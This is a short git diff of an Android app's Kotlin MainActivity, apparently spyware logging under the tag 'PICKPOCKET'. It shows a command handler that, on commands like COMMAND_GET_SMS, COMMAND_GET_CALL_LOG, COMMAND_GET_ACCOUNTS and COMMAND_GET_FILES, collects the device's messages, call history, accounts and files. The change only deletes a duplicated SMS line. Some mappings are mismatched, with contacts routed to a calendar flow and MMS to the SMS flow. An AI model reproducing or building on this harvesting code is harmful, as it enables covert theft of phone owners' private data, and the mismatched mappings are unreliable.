@@ -69,7 +69,6 @@ class MainActivity : AppCompatActivity() {
                                 "COMMAND_GET_CONTACTS" -> calendarFlow().collect { calendarEvent -> Log.d("PICKPOCKET", calendarEvent.toString()) }
                                 "COMMAND_GET_CALL_LOG" -> callLogFlow().collect { call -> Log.d("PICKPOCKET", call.toString()) }
                                 "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
-                                "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
                                 "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
                                 "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
                                 "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
